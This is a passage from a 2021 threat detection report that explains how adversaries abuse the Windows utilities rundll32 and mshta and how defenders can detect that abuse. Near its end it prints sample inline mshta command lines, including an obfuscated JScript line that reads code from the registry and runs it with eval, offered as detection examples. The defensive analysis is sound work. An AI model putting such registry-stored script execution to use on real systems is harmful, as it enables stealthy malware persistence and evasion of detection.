alert on the execution of processes that appear to be rundll32\.exe without any 
command\-line arguments, especially when they spawn child processes or make 
network connections.
Unusual process lineageAs is the case with most techniques in this report, its critical that you are able 
to take stock of what is normal in your environment if you hope to be able 
to identify what isnt. In the context of Rundll32, youll want to monitor for 
executions of rundll32\.exe from unusual or untrusted parent processes. This 
will vary from one organization to another, but some examples of process that 
usually wont spawn Rundll32 might include:
 
Microsoft Office products (e.g winword.exe, excel.exe, msaccess.exe, etc.)
 
lsass.exe
 
taskeng.exe
 
winlogon.exe
 
schtask.exe
 
regsvr32\.exe
 
wmiprvse.exe
 
wsmprovhost.exe
Weeding out false positivesWhile process monitoring and command\-line parameters are great sources 
for telemetry that can be useful for detecting malicious Rundll32, they require 
environment\-specific tuning. As you can imagine, Rundll32 is used by many 
legitimate tools. To avoid flooding your security team with a ton of false 
positives, establish a baseline on what activity is normal in your environment 
and then write rules that will exclude the known activity. This is a great starting 
point, but keep in mind that these analytics will likely require a lot of tuning and 
monitoring to get to the point where they reliably produce high\-fidelity alerting.
l T1218\.001: Rundll32
26
MshtaMshta is attractive to adversaries both in the early and latter stages of an 
infection because it enables them to proxy the execution of arbitrary code 
through a trusted utility.
Analysis
Why do adversaries use Mshta?Mshta.exe is a Windows\-native binary designed to execute Microsoft HTML 
Application (HTA) files. As its full name implies, Mshta can execute Windows 
Script Host code (VBScript and JScript) embedded within HTML in a network 
proxy\-aware fashion. These capabilities make Mshta an appealing vehicle for 
adversaries to proxy execution of arbitrary script code through a trusted, signed 
utility, making it a reliable technique during both initial and later stages of an 
infection.
How do adversaries use Mshta?There are four primary methods by which adversaries leverage Mshta to execute 
arbitrary VBScript and JScript:
 
inline via an argument passed in the command line to Mshta
 
file\-based execution via an HTML Application (HTA) file and COM\-based 
execution for lateral movement
 
by calling the RunHTMLApplication export function of mshtml.dll with 
rundll32\.exe as an alternative to mshta.exe
The two most commonly abused Mshta technique variations we observed in 
2020 were inline and file\-based execution.
Inline execution of code doesnt require the adversary to write additional files 
to disk. VBScript or JScript can be passed directly to Mshta via the command 
line for execution. This behavior gained notoriety several years ago with Kovter 
malware, remnants of which we still observed in 2020 despite this threat 
vanishing from the landscape following the 2018 indictment and arrest of the 
operators. Heres an example of Kovter persistence in action:
TECHNIQU ET 1 2 1 8 . 0 0 5
ORGANIZATIONS AFFECTED
CONFIRMED THREATS
\# 2
18\.8%
738
2021 Threat Detection Report
l T1218\.005: Mshta
PARENT TECHNIQUE RANK
27
Ursnif has used similar inline execution combined with code stored in the 
registry as part of its multistage initial access. Zscaler put out a great report 
detailing Ursnifs technique shift from PowerShell to Mshta. Notice the use of 
ActiveXObject and regread in both the Kovter example above and the Ursnif 
example below. Key terms like these make for reliable detection logic and are a 
good indication that Mshta is being mischievous.
Conversely, some adversaries choose to execute code stored in a file. 
Adversaries can direct Mshta to execute HTA content stored in a local or remote 
file by passing a location on disk, a URI, or a Universal Naming Convention (UNC) 
path (i.e a path prefixed with that points to a file share or hosted WebDAV 
server) to the file in the command line. This technique is popular because the 
malicious payload is not directly visible in the command line, as it is with inline 
execution, and permits the execution of remotely hosted HTA content in a 
proxy\-aware fashion. One threat we observed leveraging this technique in 2020 
dropped Remcos via HTA content hidden behind a shortened URL:
2021 Threat Detection Report
l T1218\.005: Mshta
28
2021 Threat Detection Report
Detection 
Collection requirements
Process and command\-line monitoringMonitoring process execution and command\-line parameters will offer 
defenders visibility into many behaviors associated with malicious abuse of 
Mshta. Similarly, process lineage is also helpful for detecting adversary use of 
Mshta. At a minimum, collect parent\-child process relationships, and, if possible, 
consider collecting information about grandparent relationships too.
Process metadataWe observed multiple adversaries this year renaming the Mshta binary to 
evade brittle detection logic. While we cover this extensively in our analysis 
of T1036\.003: Rename System Utilities, binary metadata like internal process 
names are an effective data source to determine the true identity of a
given process.
File monitoring and
network connectionsFile monitoring and network connectionssometimes used in conjunction with 
one anotherare also useful data sources for defenders seeking to observe 
potentially malicious Mshta abuse.
Emerging Mshta tradecraftAdversaries know that defenders are aware of Mshtas potential for abuse. 
Therefore, its no surprise that in 2020 we observed an increase in adversary 
techniques to disguise Mshta execution and evade brittle detection logic. The 
Agent Tesla, Azorult, Lockbit, Lokibot, and Ursnif malware families all used inline 
execution of VBScript or JScript, or file\-based execution of HTA content in files 
that did not have the commonly associated .hta file extension. This is because 
Mshta will execute HTA content in files with any extension (or none at all) as long 
as the file extension is not mapped to a textplain MIME type (e.g Mshta will not 
execute a file with a .txt extension). To further disguise Mshta execution, TA551 
renamed the binary in attempts to evade detection logic, which relied on Mshta 
executing with its expected filename of mshta.exe.
T 1 2 1 8 . 0 0 5 : 
MSHTA
Adversaries may abuse mshta.exe to 
proxy execution of malicious .hta files 
and Javascript or VBScript through 
a trusted Windows utility. There are 
several examples of different types of 
threats leveraging mshta.exe during 
initial compromise and for execution of 
code. Mshta.exe is a utility that executes 
Microsoft HTML Applications (HTA) files. 
HTAs are standalone applications that 
execute using the same models and 
technologies of Internet Explorer, but 
outside of the browser.
l T1218\.005: Mshta
29
2021 Threat Detection Report
Detection suggestionsTwo fundamental and complementary ways that you can think about detection 
for a given technique are to:
1\. Build analytics around the ways youve observed or otherwise know that 
adversaries have leveraged a technique in the past
1\. Identify all of the possible variations in the way a technique can be 
leveraged, a process discussed in detail in this blog post, and develop 
methods for detecting variations that deviate from what you expect
In our experience, its best to combine these two strategies while setting 
priorities that ensure that you have sufficient coverage against actualized threats 
in the wild. 
Inline script execution and
protocol handlersMshta permits a user to execute inline Windows Script Host (WSH) script code 
(i.e VBScript and JScript). The way that Mshta then interprets that code is 
dependent on the specified protocol handle, which is a component of Windows 
that tells the operating system how to parse and interpret protocol paths (e.g 
http:, ftp:, javascript:, vbscript:, about:, etc.).
Defenders can build detection analytics for inline Mshta script execution around 
these protocol handlers appearing in the command line. A specific detection 
example for this would be to look for the execution of mshta.exe in conjunction 
with a command line containing any of the protocol handlers that are relevant to 
Mshta: javascript, vbscript, or about, to name a few options. The following offers 
an example of what that might look like in the wild:
vbscript: 
CreateObject(WScript.Shell)
.Run(notepad.exe)
(window.close)
javascript:
dxdkDS\=kd54s;djd3\=newActiveXObject(WScript.Shell)
;vs3skdk\=dK3;
sdfkl3\=djd3\. RegRead(HKCU
software

klkndk32lk)
;esllnb3\=3m3d;eval(asdfkl2\)
;dkn3\=dks;
about:
about: